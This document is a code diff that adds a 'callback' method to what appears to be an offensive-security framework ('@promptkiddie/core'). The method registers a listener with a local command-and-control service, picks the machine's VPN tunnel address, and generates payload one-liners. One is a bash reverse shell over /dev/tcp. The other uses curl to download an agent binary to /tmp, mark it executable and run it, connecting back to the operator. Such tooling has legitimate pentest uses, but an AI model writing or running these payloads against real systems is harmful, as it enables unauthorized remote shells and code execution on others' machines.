@@ -4,6 +4,7 @@
  */
 import { execFile } from "node:child_process";
 import { readFile } from "node:fs/promises";
+import { networkInterfaces } from "node:os";
 import {
   searchKnowledge as searchKB,
   type Repo,
@@ -15,6 +16,8 @@ import {
   type ExploitHit,
   type KnowledgeResult,
   type LlmOpts,
+  type CallbackOpts,
+  type CallbackInfo,
 } from "@promptkiddie/core";
 
 interface RunContextOpts {
@@ -171,6 +174,38 @@ export function createRunContext(opts: RunContextOpts): RunContext {
         message,
         category: "progress",
       }).catch(() => {});
+    },
+
+    async callback(cbOpts?: CallbackOpts): Promise<CallbackInfo> {
+      const mode = cbOpts?.mode ?? "raw";
+      const port = cbOpts?.port ?? 0;
+      const gleipnirUrl = process.env.PK_GLEIPNIR_URL ?? "http://localhost:6666";
+
+      const resp = await fetch(`${gleipnirUrl}/api/listeners`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ port, mode }),
+      });
+      const data = await resp.json() as Record<string, unknown>;
+      const allocatedPort = (data.port ?? port) as number;
+
+      let ip = "127.0.0.1";
+      const ifaces = networkInterfaces();
+      for (const [name, addrs] of Object.entries(ifaces)) {
+        if (!name.startsWith("tun")) continue;
+        for (const a of addrs ?? []) {
+          if (a.family === "IPv4") { ip = a.address; break; }
+        }
+      }
+
+      let oneliner: string;
+      if (mode === "agent") {
+        oneliner = `curl http://${ip}:6666/api/agents/linux/amd64 -o /tmp/agent && chmod +x /tmp/agent && /tmp/agent -H ${ip} -p ${allocatedPort}`;
+      } else {
+        oneliner = `bash -c 'bash -i >& /dev/tcp/${ip}/${allocatedPort} 0>&1'`;
+      }
+
+      return { ip, port: allocatedPort, mode, oneliner };
     },
   };
 }
